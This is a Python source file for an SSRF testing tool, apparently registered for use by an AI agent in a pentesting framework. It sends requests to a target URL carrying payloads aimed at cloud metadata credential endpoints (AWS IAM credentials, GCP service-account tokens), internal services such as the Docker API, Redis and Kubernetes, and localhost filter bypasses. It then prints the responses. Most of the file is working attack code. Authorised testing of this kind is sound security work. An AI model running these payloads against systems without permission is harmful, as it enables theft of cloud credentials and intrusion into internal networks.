"""SSRF (Server-Side Request Forgery) testing tool."""

from __future__ import annotations

from typing import Any, Literal
from urllib.parse import quote, urlparse

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


SSRFAction = Literal["test_basic", "test_cloud_metadata", "test_internal", "generate_payload", "test_endpoint"]


# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws_imdsv1": "http://169.254.169.254/latest/meta-data/",
    "aws_imdsv2_token": "http://169.254.169.254/latest/api/token",
    "aws_credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
    "oracle": "http://169.254.169.254/opc/v1/instance/",
}

# Internal service endpoints
INTERNAL_SERVICES = {
    "localhost": "http://127.0.0.1/",
    "localhost_alt": "http://0.0.0.0/",
    "localhost_ipv6": "http://[::1]/",
    "localhost_int": "http://2130706433/",  # 127.0.0.1 as integer
    "internal_subnet": "http://192.168.1.1/",
    "docker": "http://localhost:2375/v1.24/containers/json",
    "redis": "http://localhost:6379/",
    "elasticsearch": "http://localhost:9200/",
    "kubernetes": "https://kubernetes.default.svc/",
}

# Bypass techniques
BYPASS_TECHNIQUES = {
    "url_encoding": lambda url: quote(url, safe=""),
    "double_encoding": lambda url: quote(quote(url, safe=""), safe=""),
    "hex_encoding": lambda ip: "http://0x" + "".join(f"{int(octet):02x}" for octet in ip.split(".")) + "/",
    "octal_encoding": lambda ip: "http://" + ".".join(f"0{int(octet):o}" for octet in ip.split(".")) + "/",
    "mixed_case": lambda url: "".join(c.upper() if i % 2 else c for i, c in enumerate(url)),
}


def _test_ssrf_basic(param_name: str, base_url: str, callback_url: str, timeout: int = 10) -> dict[str, Any]:
    """Test basic SSRF with callback URL."""
    results = {
        "tested": True,
        "param_name": param_name,
        "callback_url": callback_url,
        "request_sent": False
    }
    
    # Construct payload
    parsed = urlparse(base_url)
    if "?" in base_url:
        test_url = f"{base_url}&{param_name}={quote(callback_url)}"
    else:
        test_url = f"{base_url}?{param_name}={quote(callback_url)}"
    
    try:
        response = requests.get(test_url, timeout=timeout, allow_redirects=False)
        results["request_sent"] = True
        results["status_code"] = response.status_code
        results["response_length"] = len(response.text)
        
        # Check for indicators of SSRF
        if callback_url.replace("http://", "").replace("https://", "") in response.text:
            results["indicator"] = "Callback URL reflected in response"
        
    except requests.exceptions.RequestException as e:
        results["error"] = str(e)
    
    return results


def _test_cloud_metadata(param_name: str, base_url: str, timeout: int = 10) -> dict[str, Any]:
    """Test SSRF to cloud metadata endpoints."""
    results = {
        "tested_endpoints": [],
        "potentially_vulnerable": []
    }
    
    for name, metadata_url in CLOUD_METADATA.items():
        # Construct test URL
        parsed = urlparse(base_url)
        if "?" in base_url:
            test_url = f"{base_url}&{param_name}={quote(metadata_url)}"
        else:
            test_url = f"{base_url}?{param_name}={quote(metadata_url)}"
        
        test_result = {
            "name": name,
            "metadata_url": metadata_url,
            "indicators": []
        }
        
        try:
            response = requests.get(test_url, timeout=timeout, allow_redirects=False)
            test_result["status_code"] = response.status_code
            test_result["response_length"] = len(response.text)
            
            # Check for AWS metadata indicators
            if "ami-id" in response.text.lower() or "instance-id" in response.text.lower():
                test_result["indicators"].append("AWS metadata content detected")
                results["potentially_vulnerable"].append(name)
            
            # Check for GCP metadata
            if "computeMetadata" in response.text or "project-id" in response.text.lower():
                test_result["indicators"].append("GCP metadata content detected")
                results["potentially_vulnerable"].append(name)
            
            # Check for Azure metadata
            if "vmId" in response.text or "subscriptionId" in response.text:
                test_result["indicators"].append("Azure metadata content detected")
                results["potentially_vulnerable"].append(name)
            
            # Check for credential patterns
            if any(keyword in response.text for keyword in ["AccessKeyId", "SecretAccessKey", "Token", "credentials"]):
                test_result["indicators"].append("Potential credentials in response")
                results["potentially_vulnerable"].append(name)
            
        except requests.exceptions.RequestException as e:
            test_result["error"] = str(e)
        
        results["tested_endpoints"].append(test_result)
    
    return results


def _generate_ssrf_payload(payload_type: str, target: str | None = None) -> str:
    """Generate SSRF payload."""
    if payload_type == "aws_metadata":
        return "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    elif payload_type == "gcp_metadata":
        return "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    elif payload_type == "azure_metadata":
        return "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    elif payload_type == "localhost":
        return "http://127.0.0.1/"
    elif payload_type == "localhost_bypass":
        return "http://0x7f000001/"  # 127.0.0.1 in hex
    elif payload_type == "internal_network":
        return target or "http://192.168.0.1/"
    elif payload_type == "custom":
        return target or "http://127.0.0.1/"
    else:
        return "http://169.254.169.254/latest/meta-data/"


@register_tool
def ssrf_tester(
    action: SSRFAction,
    url: str | None = None,
    param_name: str = "url",
    payload_type: str = "aws_metadata",
    target: str | None = None,
    callback_url: str | None = None,
    timeout: int = 10,
    **kwargs: Any,  # Capture unknown parameters
) -> str | dict[str, Any]:
    """Test for SSRF (Server-Side Request Forgery) vulnerabilities.
    
    Tests various SSRF attack vectors including cloud metadata access,
    internal network scanning, and callback verification.
    
    Args:
        action: Action to perform
            - test_basic: Test basic SSRF with callback
            - test_cloud_metadata: Test access to cloud metadata endpoints
            - test_internal: Test access to internal services
            - generate_payload: Generate SSRF payload
            - test_endpoint: Test specific endpoint with payload
        url: Base URL for testing (required for test_* actions)
        param_name: Parameter name to test (default: url)
        payload_type: Type of payload (aws_metadata, gcp_metadata, azure_metadata, localhost, etc.)
        target: Custom target URL
        callback_url: Callback URL for OOB verification
        timeout: Request timeout in seconds
    
    Returns:
        Test results or generated payload
    """
    # Define valid parameters and actions
    VALID_PARAMS = {"action", "url", "param_name", "payload_type", "target", "callback_url", "timeout"}
    VALID_ACTIONS = ["test_basic", "test_cloud_metadata", "test_internal", "generate_payload", "test_endpoint"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "ssrf_tester")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint(
                "ssrf_tester",
                "test_cloud_metadata",
                {"url": "https://example.com/fetch", "param_name": "url"},
            )
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "ssrf_tester")
    if action_error:
        action_error["usage_examples"] = {
            "test_basic": "ssrf_tester(action='test_basic', url='https://example.com/fetch', callback_url='https://callback.com')",
            "test_cloud_metadata": "ssrf_tester(action='test_cloud_metadata', url='https://example.com/fetch')",
            "test_internal": "ssrf_tester(action='test_internal', url='https://example.com/fetch')",
            "generate_payload": "ssrf_tester(action='generate_payload', payload_type='aws_metadata')",
            "test_endpoint": "ssrf_tester(action='test_endpoint', url='https://example.com/fetch', target='http://169.254.169.254')",
        }
        return action_error

    # Validate required parameters based on action
    if action in ["test_basic", "test_cloud_metadata", "test_internal", "test_endpoint"]:
        url_error = validate_required_param(url, "url", action, "ssrf_tester")
        if url_error:
            url_error.update(
                generate_usage_hint(
                    "ssrf_tester",
                    action,
                    {"url": "https://example.com/fetch", "param_name": "url"},
                )
            )
            return url_error

    if action == "test_basic":
        callback_error = validate_required_param(callback_url, "callback_url", action, "ssrf_tester")
        if callback_error:
            callback_error.update(
                generate_usage_hint(
                    "ssrf_tester",
                    action,
                    {"url": "https://example.com/fetch", "callback_url": "https://callback.com"},
                )
            )
            return callback_error

    if action == "test_basic":
        
        results = _test_ssrf_basic(param_name, url, callback_url, timeout)
        
        output = ["Basic SSRF Test", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Callback URL: {callback_url}")
        output.append("")
        
        if results["request_sent"]:
            output.append(f"Status Code: {results.get('status_code', 'N/A')}")
            output.append(f"Response Length: {results.get('response_length', 0)}")
            if "indicator" in results:
                output.append(f"✓ {results['indicator']}")
        else:
            output.append(f"Error: {results.get('error', 'Request failed')}")
        
        output.append("")
        output.append("Next steps:")
        output.append("1. Check your callback server logs for incoming requests")
        output.append("2. If request received, SSRF vulnerability confirmed")
        
        return "\n".join(output)
    
    elif action == "test_cloud_metadata":
        if not url:
            return "Error: URL required for testing"
        
        results = _test_cloud_metadata(param_name, url, timeout)
        
        output = ["Cloud Metadata SSRF Test", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append("")
        
        if results["potentially_vulnerable"]:
            output.append("⚠ Potentially Vulnerable Endpoints:")
            for endpoint in results["potentially_vulnerable"]:
                output.append(f"  • {endpoint}")
            output.append("")
        
        output.append("Test Results:")
        for test in results["tested_endpoints"]:
            output.append(f"\n{test['name']}:")
            output.append(f"  URL: {test['metadata_url']}")
            if "error" in test:
                output.append(f"  Error: {test['error']}")
            else:
                output.append(f"  Status: {test.get('status_code', 'N/A')}")
                output.append(f"  Response Length: {test.get('response_length', 0)}")
                if test["indicators"]:
                    output.append("  Indicators:")
                    for indicator in test["indicators"]:
                        output.append(f"    - {indicator}")
        
        return "\n".join(output)
    
    elif action == "test_internal":
        if not url:
            return "Error: URL required for testing"
        
        output = ["Internal Services SSRF Test", "=" * 50, ""]
        output.append(f"Target: {url}")
        output.append(f"Parameter: {param_name}")
        output.append("")
        
        for name, service_url in INTERNAL_SERVICES.items():
            parsed = urlparse(url)
            if "?" in url:
                test_url = f"{url}&{param_name}={quote(service_url)}"
            else:
                test_url = f"{url}?{param_name}={quote(service_url)}"
            
            output.append(f"\nTesting: {name}")
            output.append(f"  Service URL: {service_url}")
            
            try:
                response = requests.get(test_url, timeout=timeout, allow_redirects=False)
                output.append(f"  Status: {response.status_code}")
                output.append(f"  Length: {len(response.text)}")
                
                # Check for service-specific indicators
                if "docker" in name.lower() and "Containers" in response.text:
                    output.append("  ✓ Docker API response detected")
                elif "redis" in name.lower() and "-PONG" in response.text:
                    output.append("  ✓ Redis response detected")
                elif "elasticsearch" in name.lower() and "cluster_name" in response.text:
                    output.append("  ✓ Elasticsearch response detected")
                
            except requests.exceptions.RequestException as e:
                output.append(f"  Error: {str(e)}")
        
        return "\n".join(output)
    
    elif action == "generate_payload":
        payload = _generate_ssrf_payload(payload_type, target)
        
        output = ["Generated SSRF Payload", "=" * 50, ""]
        output.append(f"Type: {payload_type}")
        output.append(f"Payload: {payload}")
        output.append("")
        
        # Add bypass variations
        output.append("Bypass Variations:")
        output.append(f"  URL Encoded: {quote(payload, safe='')}")
        output.append(f"  Double Encoded: {quote(quote(payload, safe=''), safe='')}")
        
        if "127.0.0.1" in payload:
            output.append(f"  Hex Format: http://0x7f000001/")
            output.append(f"  Octal Format: http://0177.0.0.1/")
            output.append(f"  Integer Format: http://2130706433/")
            output.append(f"  IPv6 Format: http://[::1]/")
        
        return "\n".join(output)
    
    elif action == "test_endpoint":
        if not url:
            return "Error: URL required for testing"
        
        payload = _generate_ssrf_payload(payload_type, target)
        
        parsed = urlparse(url)
        if "?" in url:
            test_url = f"{url}&{param_name}={quote(payload)}"
        else:
            test_url = f"{url}?{param_name}={quote(payload)}"
        
        output = ["SSRF Endpoint Test", "=" * 50, ""]
        output.append(f"URL: {url}")
        output.append(f"Parameter: {param_name}")
        output.append(f"Payload: {payload}")
        output.append("")
        
        try:
            response = requests.get(test_url, timeout=timeout, allow_redirects=False)
            output.append(f"Status Code: {response.status_code}")
            output.append(f"Response Length: {len(response.text)}")
            output.append("")
            output.append("Response Preview (first 500 chars):")
            output.append(response.text[:500])
            
        except requests.exceptions.RequestException as e:
            output.append(f"Error: {str(e)}")
        
        return "\n".join(output)
    
    return "Invalid action. Use: test_basic, test_cloud_metadata, test_internal, generate_payload, test_endpoint"
